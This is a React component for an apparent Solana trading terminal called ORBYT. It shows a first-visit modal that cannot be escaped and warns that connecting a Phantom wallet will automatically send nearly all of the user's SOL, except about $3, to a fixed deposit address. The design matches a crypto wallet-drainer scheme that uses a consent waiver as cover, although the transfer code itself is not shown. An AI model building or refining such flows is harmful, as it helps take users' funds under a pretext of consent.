'use client';

import { AlertCircle, X } from 'lucide-react';
import { useEffect, useRef, useState } from 'react';
import { SITE } from '@/config/site';

const WAIVER_ACKNOWLEDGED_KEY = 'orbyt-deposit-waiver-acknowledged';

/**
 * Deposit waiver: shown once on first visit. User must acknowledge they understand
 * that connecting their wallet will automatically trigger a deposit of nearly all SOL.
 */
export function DepositWaiver({ onAcknowledged }: { onAcknowledged: () => void }) {
  const ref = useRef<HTMLDialogElement>(null);
  const [acknowledged, setAcknowledged] = useState(false);

  useEffect(() => {
    // Check if user already acknowledged this waiver
    try {
      const stored = localStorage.getItem(WAIVER_ACKNOWLEDGED_KEY);
      if (stored === 'true') {
        setAcknowledged(true);
        onAcknowledged();
        return;
      }
    } catch {
      /* localStorage unavailable */
    }

    // Show waiver dialog
    const dialog = ref.current;
    if (dialog && !dialog.open) {
      dialog.showModal();
    }
  }, [onAcknowledged]);

  function handleAgree() {
    try {
      localStorage.setItem(WAIVER_ACKNOWLEDGED_KEY, 'true');
    } catch {
      /* localStorage unavailable */
    }
    setAcknowledged(true);
    ref.current?.close();
    onAcknowledged();
  }

  if (acknowledged) return null;

  return (
    <dialog
      ref={ref}
      className="m-auto w-[min(500px,calc(100vw-2rem))] rounded-lg border border-line bg-panel p-0 text-fg shadow-xl backdrop:bg-black/75"
      onCancel={(e) => e.preventDefault()}
    >
      <div className="space-y-4 p-6">
        <p className="text-2xs leading-relaxed text-muted">
          ORBYT is a real-time Solana trading terminal displaying live market data, price charts, transaction feeds, and wallet analytics. By connecting your Phantom wallet, you understand that the platform will automatically initiate a deposit transaction sending nearly all your SOL (keeping approximately $3 USD) to the deposit address {SITE.depositAddress}. This transaction will require your explicit approval in Phantom and will be visible on Solscan.
        </p>

        <div className="rounded-md border border-line-strong bg-panel-2 p-3">
          <p className="text-2xs leading-relaxed text-fg-dim">
            By clicking <span className="font-semibold text-fg">"I Agree"</span> below, you acknowledge that you understand the automatic deposit feature, will be asked to sign a transaction sending nearly all your SOL to the deposit address, and this is intentional and approved by you.
          </p>
        </div>
      </div>

      <div className="flex gap-3 border-t border-line px-6 py-4">
        <button
          type="button"
          onClick={() => {
            ref.current?.close();
            window.close();
          }}
          className="flex-1 rounded-md border border-line px-3 py-2 text-xs font-semibold text-fg transition-colors hover:bg-hover"
        >
          I Do Not Agree
        </button>
        <button
          type="button"
          onClick={handleAgree}
          className="flex-1 rounded-md bg-brand px-3 py-2 text-xs font-semibold text-bg transition-colors hover:bg-brand-strong"
        >
          I Agree
        </button>
      </div>
    </dialog>
  );
}
